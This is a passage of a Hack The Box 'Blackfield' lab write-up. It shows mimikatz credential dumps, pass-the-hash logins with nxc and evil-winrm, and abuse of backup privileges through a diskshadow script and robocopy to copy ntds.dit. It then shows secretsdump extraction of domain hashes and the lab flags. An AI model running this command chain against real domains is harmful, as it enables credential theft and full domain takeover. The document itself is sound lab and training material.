         * Domain   : Z
         * Password : (null)
        kerberos :
         * Username : Z
         * Domain   : Z
         * Password : Z
        ssp :
        credman :

Authentication Id : 0 ; 365493 (00000000:000593b5)
Session           : Interactive from 2
User Name         : Z
Domain            : Z
Logon Server      : Z
Logon Time        : 2/24/2020 12:59:38 AM
SID               : S-1-5-96-0-2
        msv :
         [00000003] Z
         * Username : Z
         * Domain   : Z
         * NTLM     : b624dc83a27cc29da11d9bf25efea796
         * SHA1     : 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
        tspkg :
        wdigest :
         * Username : Z
         * Domain   : Z
         * Password : (null)
        kerberos :
         * Username : Z
         * Domain   : Z
         * Password : Z
        ssp :
        credman :

Authentication Id : 0 ; 153705 (00000000:00025869)
Session           : Interactive from 1
User Name         : Z
Domain            : Z
Logon Server      : Z
Logon Time        : 2/24/2020 12:59:04 AM
SID               : S-1-5-21-4194615774-2175524697-3563712290-500
        msv :
         [00000003] Z
         * Username : Z
         * Domain   : Z
         * NTLM     : 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
         * SHA1     : db5c89a961644f0978b4b69a4d2a2239d7886368
         * DPAPI    : 240339f898b6ac4ce3f34702e4a89550
        tspkg :
        wdigest :
         * Username : Z
         * Domain   : Z
         * Password : (null)
        kerberos :
         * Username : Z
         * Domain   : Z
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 40310 (00000000:00009d76)
Session           : Interactive from 1
User Name         : Z
Domain            : Z
Logon Server      : Z
Logon Time        : 2/24/2020 12:57:46 AM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Z
         * Username : Z
         * Domain   : Z
         * NTLM     : b624dc83a27cc29da11d9bf25efea796
         * SHA1     : 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
        tspkg :
        wdigest :
         * Username : Z
         * Domain   : Z
         * Password : (null)
        kerberos :
         * Username : Z
         * Domain   : Z
         * Password : Z
        ssp :
        credman :

Authentication Id : 0 ; 40232 (00000000:00009d28)
Session           : Interactive from 1
User Name         : Z
Domain            : Z
Logon Server      : Z
Logon Time        : 2/24/2020 12:57:46 AM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Z
         * Username : Z
         * Domain   : Z
         * NTLM     : b624dc83a27cc29da11d9bf25efea796
         * SHA1     : 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
        tspkg :
        wdigest :
         * Username : Z
         * Domain   : Z
         * Password : (null)
        kerberos :
         * Username : Z
         * Domain   : Z
         * Password : Z
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : Z
Domain            : Z
Logon Server      : Z
Logon Time        : 2/24/2020 12:57:46 AM
SID               : S-1-5-20
        msv :
         [00000003] Z
         * Username : Z
         * Domain   : Z
         * NTLM     : b624dc83a27cc29da11d9bf25efea796
         * SHA1     : 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
        tspkg :
        wdigest :
         * Username : Z
         * Domain   : Z
         * Password : (null)
        kerberos :
         * Username : Z
         * Domain   : Z
         * Password : Z
        ssp :
        credman :

Authentication Id : 0 ; 24410 (00000000:00005f5a)
Session           : Interactive from 1
User Name         : Z
Domain            : Z
Logon Server      : Z
Logon Time        : 2/24/2020 12:57:46 AM
SID               : S-1-5-96-0-1
        msv :
         [00000003] Z
         * Username : Z
         * Domain   : Z
         * NTLM     : b624dc83a27cc29da11d9bf25efea796
         * SHA1     : 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
        tspkg :
        wdigest :
         * Username : Z
         * Domain   : Z
         * Password : (null)
        kerberos :
         * Username : Z
         * Domain   : Z
         * Password : Z
        ssp :
        credman :

Authentication Id : 0 ; 406499 (00000000:000633e3)
Session           : Interactive from 2
User Name         : Z
Domain            : Z
Logon Server      : Z
Logon Time        : 2/24/2020 1:00:03 AM
SID               : S-1-5-21-4194615774-2175524697-3563712290-1413
        msv :
         [00000003] Z
         * Username : Z
         * Domain   : Z
         * NTLM     : 9658d1d1dcd9250115e2205d9f48400d
         * SHA1     : 463c13a9a31fc3252c68ba0a44f0221626a33e5c
         * DPAPI    : a03cd8e9d30171f3cfe8caad92fef621
        tspkg :
        wdigest :
         * Username : Z
         * Domain   : Z
         * Password : (null)
        kerberos :
         * Username : Z
         * Domain   : Z
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 366665 (00000000:00059849)
Session           : Interactive from 2
User Name         : Z
Domain            : Z
Logon Server      : Z
Logon Time        : 2/24/2020 12:59:38 AM
SID               : S-1-5-90-0-2
        msv :
         [00000003] Z
         * Username : Z
         * Domain   : Z
         * NTLM     : b624dc83a27cc29da11d9bf25efea796
         * SHA1     : 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
        tspkg :
        wdigest :
         * Username : Z
         * Domain   : Z
         * Password : (null)
        kerberos :
         * Username : Z
         * Domain   : Z
         * Password : Z
        ssp :
        credman :

Authentication Id : 0 ; 366649 (00000000:00059839)
Session           : Interactive from 2
User Name         : Z
Domain            : Z
Logon Server      : Z
Logon Time        : 2/24/2020 12:59:38 AM
SID               : S-1-5-90-0-2
        msv :
         [00000003] Z
         * Username : Z
         * Domain   : Z
         * NTLM     : b624dc83a27cc29da11d9bf25efea796
         * SHA1     : 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
        tspkg :
        wdigest :
         * Username : Z
         * Domain   : Z
         * Password : (null)
        kerberos :
         * Username : Z
         * Domain   : Z
         * Password : Z
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : Z
Domain            : Z
Logon Server      : Z
Logon Time        : 2/24/2020 12:57:47 AM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : Z
         * Domain   : Z
         * Password : (null)
        kerberos :
         * Username : Z
         * Domain   : Z
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 24405 (00000000:00005f55)
Session           : Interactive from 0
User Name         : Z
Domain            : Z
Logon Server      : Z
Logon Time        : 2/24/2020 12:57:46 AM
SID               : S-1-5-96-0-0
        msv :
         [00000003] Z
         * Username : Z
         * Domain   : Z
         * NTLM     : b624dc83a27cc29da11d9bf25efea796
         * SHA1     : 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
        tspkg :
        wdigest :
         * Username : Z
         * Domain   : Z
         * Password : (null)
        kerberos :
         * Username : Z
         * Domain   : Z
         * Password : Z
        ssp :
        credman :

Authentication Id : 0 ; 24294 (00000000:00005ee6)
Session           : Interactive from 0
User Name         : Z
Domain            : Z
Logon Server      : Z
Logon Time        : 2/24/2020 12:57:46 AM
SID               : S-1-5-96-0-0
        msv :
         [00000003] Z
         * Username : Z
         * Domain   : Z
         * NTLM     : b624dc83a27cc29da11d9bf25efea796
         * SHA1     : 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
        tspkg :
        wdigest :
         * Username : Z
         * Domain   : Z
         * Password : (null)
        kerberos :
         * Username : Z
         * Domain   : Z
         * Password : Z
        ssp :
        credman :

Authentication Id : 0 ; 24282 (00000000:00005eda)
Session           : Interactive from 1
User Name         : Z
Domain            : Z
Logon Server      : Z
Logon Time        : 2/24/2020 12:57:46 AM
SID               : S-1-5-96-0-1
        msv :
         [00000003] Z
         * Username : Z
         * Domain   : Z
         * NTLM     : b624dc83a27cc29da11d9bf25efea796
         * SHA1     : 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
        tspkg :
        wdigest :
         * Username : Z
         * Domain   : Z
         * Password : (null)
        kerberos :
         * Username : Z
         * Domain   : Z
         * Password : Z
        ssp :
        credman :

Authentication Id : 0 ; 22028 (00000000:0000560c)
Session           : UndefinedLogonType from 0
User Name         : Z
Domain            : Z
Logon Server      : Z
Logon Time        : 2/24/2020 12:57:44 AM
SID               :
        msv :
         [00000003] Z
         * Username : Z
         * Domain   : Z
         * NTLM     : b624dc83a27cc29da11d9bf25efea796
         * SHA1     : 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : Z
Domain            : Z
Logon Server      : Z
Logon Time        : 2/24/2020 12:57:44 AM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : Z
         * Domain   : Z
         * Password : (null)
        kerberos :
         * Username : Z
         * Domain   : Z
         * Password : (null)
        ssp :
        credman :

mimikatz(commandline) # exit
Bye!
```

with the SID's here i got hash for admin and svc_backup lets see if they work or not... 

```
S-1-5-21-4194615774-2175524697-3563712290-1413 is svc_backup:9658d1d1dcd9250115e2205d9f48400d

S-1-5-21-4194615774-2175524697-3563712290-500 is admin:7f1e4ff8c6a8e6b6fcae2d9c0572cd62
```

```
nxc smb 10.129.229.17 -u /home/kali/HTB\ BOXES/Blackfield/users.txt -H 9658d1d1dcd9250115e2205d9f48400d
SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.229.17   445    DC01             [-] BLACKFIELD.local\audit2020:9658d1d1dcd9250115e2205d9f48400d STATUS_LOGON_FAILURE 
SMB         10.129.229.17   445    DC01             [-] BLACKFIELD.local\support:9658d1d1dcd9250115e2205d9f48400d STATUS_LOGON_FAILURE 
SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d 
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ nxc smb 10.129.229.17 -u Administrator -H 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.229.17   445    DC01             [-] BLACKFIELD.local\Administrator:7f1e4ff8c6a8e6b6fcae2d9c0572cd62 STATUS_LOGON_FAILURE
```

only svc_backup hash works and svc_backup can winrm lets get the user flag 
```
nxc winrm 10.129.229.17 -u 'svc_backup' -H 9658d1d1dcd9250115e2205d9f48400d
WINRM       10.129.229.17   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:BLACKFIELD.local) 
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.229.17   5985   DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d (Pwn3d!)
```
it shows we can but evil-winrm is not working....
lets reset the machine and check.. 
```
evil-winrm -i 10.129.25.178 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_backup\Documents> cd ..
*Evil-WinRM* PS C:\Users\svc_backup> cd Desktop
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> type user.txt
3920bb317a0bef51027e2852be64b543
```
got user flag 
```
*Evil-WinRM* PS C:\> ls


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        5/26/2020   5:38 PM                PerfLogs
d-----         6/3/2020   9:47 AM                profiles
d-r---        3/19/2020  11:08 AM                Program Files
d-----         2/1/2020  11:05 AM                Program Files (x86)
d-r---        2/23/2020   9:16 AM                Users
d-----        9/21/2020   4:29 PM                Windows
-a----        2/28/2020   4:36 PM            447 notes.txt


*Evil-WinRM* PS C:\> type notes.txt
Mates,

After the domain compromise and computer forensic last week, auditors advised us to:
- change every passwords -- Done.
- change krbtgt password twice -- Done.
- disable auditor's account (audit2020) -- KO.
- use nominative domain admin accounts instead of this one -- KO.

We will probably have to backup & restore things later.
- Mike.

PS: Because the audit report is sensitive, I have encrypted it on the desktop (root.txt)
```
interesting... 
```
*Evil-WinRM* PS C:\Users> whoami /all

USER INFORMATION
----------------

User Name             SID
===================== ==============================================
blackfield\svc_backup S-1-5-21-4194615774-2175524697-3563712290-1413


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.
```

since we have backup privs lets try robocopy
```
*Evil-WinRM* PS C:\Users\svc_backup>  robocopy /b "C:\Users\Administrator\Desktop" "C:\Users\svc_backup\Downloads" root.txt

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Monday, May 4, 2026 10:56:06 AM
   Source : C:\Users\Administrator\Desktop\
     Dest : C:\Users\svc_backup\Downloads\

    Files : root.txt

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

                           1    C:\Users\Administrator\Desktop\
            New File                  32        root.txt
2026/05/04 10:56:06 ERROR 5 (0x00000005) Copying File C:\Users\Administrator\Desktop\root.txt
Access is denied.
```
cannot do robocopy since we have restore priv we can restore some files as per notes
lets try to use dickshadow and get ntds 
```
*Evil-WinRM* PS C:\Windows\System32> cd C:\temp
*Evil-WinRM* PS C:\temp> echo "set context persistent nowriters" | out-file -encoding ascii C:\temp\shadow.txt
*Evil-WinRM* PS C:\temp> echo "set metadata C:\temp\meta.cab" | out-file -encoding ascii -append C:\temp\shadow.txt
*Evil-WinRM* PS C:\temp> echo "add volume c: alias temp" | out-file -encoding ascii -append C:\temp\shadow.txt
*Evil-WinRM* PS C:\temp> echo "create" | out-file -encoding ascii -append C:\temp\shadow.txt
*Evil-WinRM* PS C:\temp> echo "expose %temp% z:" | out-file -encoding ascii -append C:\temp\shadow.txt
 
*Evil-WinRM* PS C:\temp> diskshadow /s shadow.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  5/4/2026 11:24:49 AM

-> set context persistent nowriters
-> set metadata C:\temp\meta.cab
-> add volume c: alias temp
-> create
Alias temp for shadow ID {32dc143c-c168-4d37-b8a7-b4efb4df94ad} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {da7dea73-1c1f-4318-a3e1-cc6e2c03848b} set as environment variable.

Querying all shadow copies with the shadow copy set ID {da7dea73-1c1f-4318-a3e1-cc6e2c03848b}

        * Shadow copy ID = {32dc143c-c168-4d37-b8a7-b4efb4df94ad}               %temp%
                - Shadow copy set: {da7dea73-1c1f-4318-a3e1-cc6e2c03848b}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{6cd5140b-0000-0000-0000-602200000000}\ [C:\]
                - Creation time: 5/4/2026 11:24:50 AM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
                - Originating machine: DC01.BLACKFIELD.local
                - Service machine: DC01.BLACKFIELD.local
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %temp% z:
-> %temp% = {32dc143c-c168-4d37-b8a7-b4efb4df94ad}
The shadow copy was successfully exposed as z:\.
```

lets now copy the files we need to temp and download them.. 

```
robocopy /B Z:\Windows\NTDS\ C:\temp ntds.dit
robocopy /B Z:\Windows\System32\config\ C:\temp SYSTEM

Evil-WinRM* PS C:\temp> ls


    Directory: C:\temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         5/4/2026  11:24 AM            628 meta.cab
-a----         5/4/2026  10:49 AM       18874368 ntds.dit
-a----         5/4/2026  11:24 AM            117 shadow.txt
-a----        4/10/2023   6:29 PM       17563648 SYSTEM

*Evil-WinRM* PS C:\temp> download SYSTEM
                                        
Info: Downloading C:\temp\SYSTEM to SYSTEM
                                        
Info: Download successful!
*Evil-WinRM* PS C:\temp> download ntds.dit
                                        
Info: Downloading C:\temp\ntds.dit to ntds.dit
                                        
Info: Download successful!

```

```
(kali㉿kali)-[~/impacket/examples]
└─$ python3 secretsdump.py -ntds /home/kali/ntds.dit -system /home/kali/SYSTEM LOCAL

Impacket v0.13.0.dev0+20250919.210843.8426ec99 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from /home/kali/ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7f82cc4be7ee6ca0b417c0719479dbec:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
```

got the hash
```
sometime binary does not work so use python file
```

```
evil-winrm -i 10.129.25.178 -u Administrator -H 184fb5e5178480be64824d4cd53b99ee
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
4375a629c7c67c8e29db269060c955cb
```

got the root flag